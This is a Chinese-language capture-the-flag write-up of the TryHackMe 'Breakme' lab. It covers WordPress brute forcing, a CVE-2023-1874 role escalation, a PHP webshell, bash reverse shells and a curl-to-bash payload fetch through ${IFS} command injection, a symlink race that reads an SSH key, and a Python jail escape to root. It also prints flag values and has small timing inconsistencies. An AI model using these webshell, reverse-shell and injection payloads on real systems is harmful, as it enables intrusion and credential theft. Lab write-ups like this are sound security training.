- Writeup - Breakme (10.49.149.30)

  ## 靶机信息
  - **IP**: 10.49.149.30
  - **平台**: TryHackMe (THM)
  - **主机名**: Breakme
  - **OS**: Debian Linux 5.10.0-8-amd64
  - **难度**: Medium
  - **完成时间**: 2026-06-09

  ## 攻击时间线
  - **开始**: 2026-06-09 11:58
  - **完成**: 2026-06-09 16:42
  - **总耗时**: ~120 分钟

  ---

  ## 1. 信息搜集

  ### 1.1 Nmap 端口扫描
  ```bash
  nmap -sV -p- --min-rate=1000 10.49.149.30
  ```

  **发现端口：**
  | 端口   | 服务 | 版本                           |
  | ------ | ---- | ------------------------------ |
  | 22/tcp | ssh  | OpenSSH 8.4p1 Debian 5+deb11u1 |
  | 80/tcp | http | Apache httpd 2.4.56 (Debian)   |

  **OS 判断**: Debian Linux（基于 Apache 2.4.56 + OpenSSH 8.4p1）

  ### 1.2 Web 目录枚举
  ```bash
  gobuster dir -u http://10.49.149.30 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,zip -t 20
  ```

  **发现目录：**
  - `/wordpress` → WordPress 站点
  - `/manual` → Apache 手册
  - `/index.html` → 默认首页

  ---

  ## 2. WordPress 枚举

  ### 2.1 版本识别
  ```bash
  curl -s http://10.49.149.30/wordpress/ | grep -i "generator"
  ```
  **结果**: WordPress 6.4.3

  ### 2.2 插件识别
  ```bash
  curl -s http://10.49.149.30/wordpress/ | grep "wp-content/plugins"
  ```
  **发现插件**: WP Data Access 5.3.5

  ### 2.3 用户枚举
  ```bash
  wpscan --url http://10.49.149.30/wordpress/ --enumerate u --no-update
  ```

  **发现用户：**
  - admin (ID: 1)
  - bob (ID: 2)

  ### 2.4 密码爆破
  ```bash
  wpscan --url http://10.49.149.30/wordpress/ --passwords /usr/share/wordlists/rockyou.txt --usernames bob,admin
  ```

  **结果**: bob / soccer

  ---

  ## 3. CVE-2023-1874 权限提升

  ### 3.1 漏洞背景
  WP Data Access 5.3.5 存在权限提升漏洞（CVE-2023-1874）：
  - 影响版本: ≤ 5.3.7
  - 漏洞类型: 缺少授权检查
  - 攻击条件: "Enable role management" 设置启用

  ### 3.2 利用过程
  1. 使用 bob/soccer 登录 WordPress
  2. 进入 Users → Your Profile
  3. 在浏览器开发者工具中修改表单，添加隐藏字段:
     ```html
     <input type="hidden" name="wpda_role[]" value="administrator">
     ```
  4. 保存 Profile
  5. bob 从 Subscriber 提升为 Administrator

  ### 3.3 验证
  登录后左侧菜单出现:
  - Appearance → Theme Editor
  - Plugins → Plugin Editor
  - 确认 bob 已拥有管理员权限

  ---

  ## 4. 获取初始 Shell (www-data)

  ### 4.1 植入 Webshell
  1. 进入 Appearance → Theme Editor
  2. 选择 twentytwentyone 主题
  3. 打开 404.php 文件
  4. 在文件开头添加:
     ```php
     <?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>
     ```
  5. 点击 Update File 保存

  ### 4.2 验证 Webshell
  ```bash
  curl "http://10.49.149.30/wordpress/wp-content/themes/twentytwentyone/404.php?cmd=whoami"
  ```
  **返回**: www-data

  ### 4.3 反弹 Shell
  Kali 监听:
  ```bash
  nc -lvnp 4444
  ```

  目标执行:
  ```bash
  curl "http://10.49.149.30/wordpress/wp-content/themes/twentytwentyone/404.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.241.203/4444%200%3E%261%27"
  ```

  **获取**: www-data shell

  ---

  ## 5. 横向移动 → john 用户

  ### 5.1 发现内部服务
  ```bash
  netstat -tulpn
  ```
  **发现**: 127.0.0.1:9999 运行未知服务

  ### 5.2 端口转发
  ```bash
  在目标机器上：
  socat TCP-LISTEN:5555,fork TCP:127.0.0.1:9999
  在kali上：
  socat TCP-LISTEN:9999,fork TCP:10.10.72.131:5555
  ```

  ### 5.3 分析内部服务
  访问 http://127.0.0.1:9999/ 发现 "My Tools" 页面，包含三个功能:
  - Check Target (cmd1)
  - Check User (cmd2)
  - Check File (cmd3)

  ### 5.4 命令注入测试
  测试各种绕过方式:
  ```bash
  # 测试分号 - 失败
  curl -X POST http://127.0.0.1:9999/ -d "cmd1=127.0.0.1;whoami"
  # 返回: Invalid IP address
  
  # 测试管道符 - 失败
  curl -X POST http://127.0.0.1:9999/ -d "cmd2=root|id"
  # 返回: User root|id not found
  
  # 测试 ${IFS} - 成功！
  curl -X POST http://127.0.0.1:9999/ -d "cmd2=root|curl${IFS}http://192.168.241.203:8000"
  ```

  Kali 收到 HTTP 请求，确认命令注入成功！

  ### 5.5 获取 john Shell
  Kali 准备 reverse.sh:
  ```bash
  echo 'bash -i >& /dev/tcp/192.168.241.203/1234 0>&1' > reverse.sh
  python3 -m http.server 8000
  ```

  目标执行:
  ```bash
  curl -X POST http://127.0.0.1:9999/ -d "cmd2=root|curl${IFS}http://192.168.241.203:8000/reverse.sh|bash"
  ```

  Kali 监听:
  ```bash
  nc -lvnp 1234
  ```

  **获取**: john shell
  ```
  john@Breakme:~/internal$
  ```

  ---

  ## 6. 横向移动 → youcef 用户

  ### 6.1 发现 SUID 程序
  ```bash
  find / -perm -4000 -type f 2>/dev/null
  ```
  **发现**: /home/youcef/readfile (SUID youcef)

  ### 6.2 分析 readfile 程序
  ```bash
  strings /home/youcef/readfile | grep -i "nice\|try\|flag\|id_rsa"
  ```
  **发现保护关键词**:
  - "flag" → 触发 "Nice try!"
  - "id_rsa" → 触发 "Nice try!"
  - "readfile.c" → 触发 "Nice try!"

  ### 6.3 TOCTOU 竞态条件攻击
  原理: 在 readfile 检查文件名和打开文件之间的时间窗口，快速切换 symlink 指向。

  攻击脚本:
  ```bash
  cd /home/john
  
  # 后台循环创建/删除 symlink
  while true; do ln -sf /home/youcef/.ssh/id_rsa key; rm key; touch key; done &
  
  # 同时循环执行 readfile
  for i in {1..50}; do /home/youcef/./readfile key; done
  ```

  **成功输出**:
  ```
  I guess you won!
  -----BEGIN OPENSSH PRIVATE KEY-----
  b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCGzrHvF6
  Tuf+ZdUVQpV+cXAAAAEAAAAAEAAAILAAAAB3NzaC1yc2EAAAADAQABAAAB9QCwwxfZdy0Z
  ...
  -----END OPENSSH PRIVATE KEY-----
  ```

  ### 6.4 保存并破解私钥
  保存私钥到 Kali:
  ```bash
  cat > /tmp/youcef_id_rsa << 'EOF'
  -----BEGIN OPENSSH PRIVATE KEY-----
  ...
  -----END OPENSSH PRIVATE KEY-----
  EOF
  chmod 600 /tmp/youcef_id_rsa
  ```

  使用 John 破解 passphrase:
  ```bash
  ssh2john /tmp/youcef_id_rsa > /tmp/youcef.hash
  john /tmp/youcef.hash --wordlist=/usr/share/wordlists/rockyou.txt
  ```

  **结果**: passphrase = a123456

  ### 6.5 SSH 登录 youcef
  ```bash
  ssh -i /tmp/youcef_id_rsa youcef@10.49.149.30
  # 输入密码: a123456
  ```

  **登录成功**:
  ```
  youcef@Breakme:~$ id
  uid=1000(youcef) gid=1000(youcef) groups=1000(youcef)
  ```

  ---

  ## 7. 权限提升 → root

  ### 7.1 发现 sudo 权限
  ```bash
  sudo -l
  ```
  **结果**:
  ```
  User youcef may run the following commands on breakme:
      (root) NOPASSWD: *** /root/jail.py
  ```

  ### 7.2 分析 jail.py
  ```bash
  sudo /usr/bin/python3 /root/jail.py
  ```
  **输出**:
  ```
  Welcome to Python jail
  Will you stay locked forever
  Or will you BreakMe
  >>
  ```

  这是一个 Python 沙箱，限制执行危险代码。

  ### 7.3 测试过滤规则
  ```python
  >> import os
  Illegal Input
  
  >> breakpoint()
  Illegal Input
  
  >> __import__('os')
  Illegal Input
  ```

  发现过滤了:
  - import 关键字
  - breakpoint() 函数
  - __import__ 属性

  ### 7.4 Unicode 变体绕过
  使用 Unicode 数学斜体字符（Mathematical Italic）绕过字符串匹配:
  ```python
  𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()
  ```

  **成功进入 pdb 调试器**:
  ```
  --Return--
  > <string>(1)<module>()->None
  (Pdb)
  ```

  ### 7.5 在 pdb 中执行任意代码
  ```python
  (Pdb) import os
  (Pdb) os.system("/bin/bash")
  ```

  **获取 root shell**:
  ```
  root@Breakme:/home/youcef#
  ```

  ### 7.6 绕过原理分析
  Python 的字符串过滤使用简单的字符串匹配（如 `if 'import' in user_input`），而 Unicode 变体字符（如 𝘣 U+1D623）虽然显示为正常字母，但 Unicode 码点不同，因此绕过了过滤规则。

  ---

  ## 8. Flag 获取

  ### 8.1 user1.txt
  ```bash
  cat /home/john/user1.txt
  ```
  **结果**: `5c3ea0d312568c7ac68d213785b26677`

  ### 8.2 user2.txt
  ```bash
  find / -name "user*.txt" 2>/dev/null
  ```
  **发现**: /home/youcef/.ssh/user2.txt

  ```bash
  cat /home/youcef/.ssh/user2.txt
  ```
  **结果**: `df5b1b7f4f74a416ae27673b22633c1b`

  ### 8.3 root.txt
  ```bash
  cat /root/.root.txt
  ```
  **结果**: `e257d58481412f8772e9fb9fd47d8ca4`

  ---

  ## 9. 攻击路径总结

  ```
  外部攻击者
      ↓
  Nmap 扫描 → 发现 22/80
      ↓
  Gobuster → 发现 /wordpress
      ↓
  WPScan → 枚举用户 bob/admin
      ↓
  密码爆破 → bob/soccer
      ↓
  CVE-2023-1874 → bob 提升为 Administrator
      ↓
  主题编辑 → 植入 webshell → www-data shell
      ↓
  netstat → 发现 127.0.0.1:9999
      ↓
  命令注入 → |curl${IFS}... → 下载 reverse.sh
      ↓
  反弹 shell → john 用户
      ↓
  发现 readfile (SUID youcef)
      ↓
  TOCTOU 竞态条件 → 读取 youcef 私钥
      ↓
  John 破解 → passphrase = a123456
      ↓
  SSH youcef → youcef shell
      ↓
  sudo jail.py → Python 沙箱
      ↓
  Unicode 绕过 𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵() → pdb 调试器
      ↓
  import os; os.system("/bin/bash") → root shell
      ↓
  获取 3 个 Flags
  ```

  ---

  ## 10. 关键技术点详解

  ### 10.1 CVE-2023-1874
  - **漏洞**: WP Data Access 插件的 `multiple_roles_update` 函数缺少授权检查
  - **利用**: 在 Profile 更新时提交 `wpda_role[]=administrator`
  - **影响**: 任何已登录用户（包括 Subscriber）可提升为 Administrator

  ### 10.2 ${IFS} 命令注入绕过
  - **原理**: ${IFS} 是 Bash 的内置变量，默认值为空格/制表符/换行符
  - **利用**: `curl${IFS}http://...` 被解析为 `curl http://...`
  - **优势**: 绕过简单的空格过滤规则

  ### 10.3 TOCTOU 竞态条件
  - **原理**: Time-of-Check to Time-of-Use 漏洞
  - **场景**: readfile 程序先检查文件名（strstr），然后打开文件（open）
  - **利用**: 在检查和打开之间快速切换 symlink 指向目标文件
  - **代码**:
    ```bash
    while true; do
        ln -sf /home/youcef/.ssh/id_rsa symlink
        rm symlink
        touch symlink
    done &
    ```

  ### 10.4 Unicode 变体绕过
  - **原理**: Python 的字符串过滤使用简单的 `in` 操作符
  - **字符**: 𝘣 (U+1D623), 𝘳 (U+1D63F), 𝘦 (U+1D626) 等数学斜体字符
  - **效果**: 视觉上和正常字母相同，但 Unicode 码点不同
  - **利用**: `𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()` 绕过 `if 'breakpoint' in input:` 检查

  ---

  ## 11. 防御建议

  1. **WordPress 安全**
     - 及时更新插件（WP Data Access 已修复 CVE-2023-1874）
     - 禁用不必要的主题/插件编辑功能
     - 使用强密码策略

  2. **命令注入防护**
     - 对用户输入进行严格的输入验证
     - 使用参数化查询/命令
     - 禁用危险的 shell 函数

  3. **TOCTOU 防护**
     - 使用文件描述符而非文件名进行后续操作
     - 在打开文件后使用 `fstat` 验证文件属性
     - 避免使用 symlink 进行敏感操作

  4. **Python Jail 防护**
     - 使用 AST 分析而非简单的字符串匹配
     - 在受限环境中运行（如 seccomp、chroot）
     - 禁用 `breakpoint()` 和 `pdb` 模块

  ---

  ## 13. 靶机状态
  - **状态**: ✅ 全部完成
  - **获取 Flags**: 3/3 (user1 + user2 + root)
  - **总耗时**: ~120 分钟
  - **攻击复杂度**: 高（涉及多个漏洞链和高级技术）